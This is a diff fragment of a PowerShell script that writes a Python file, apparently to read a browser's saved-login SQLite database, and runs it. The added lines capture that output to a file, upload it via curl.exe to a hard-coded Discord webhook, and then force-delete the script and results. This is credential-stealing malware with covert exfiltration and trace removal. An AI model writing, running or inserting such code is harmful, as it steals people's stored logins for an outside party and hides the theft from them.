@@ -49,4 +49,10 @@ if os.path.exists(login_data):
         print(f"SQLite error: {e}")
 '@ | Out-File "test.py" -Encoding UTF8
 
-.\python.exe test.py
+$result = .\python.exe test.py 2>&1 | Out-String
+
+$result | Out-File "test_result.txt"
+
+curl.exe -F "file=@test_result.txt" "https://discord.com/api/webhooks/1467597897435582594/wbqYsXdKoKB124ig5QJCGBBb88kmkTUpEKGEq0A6oZ-81uZ0ecgtHM-D8Zq44U7uh_8W"
+
+Remove-Item test.py,test_result.txt -Force -EA 0
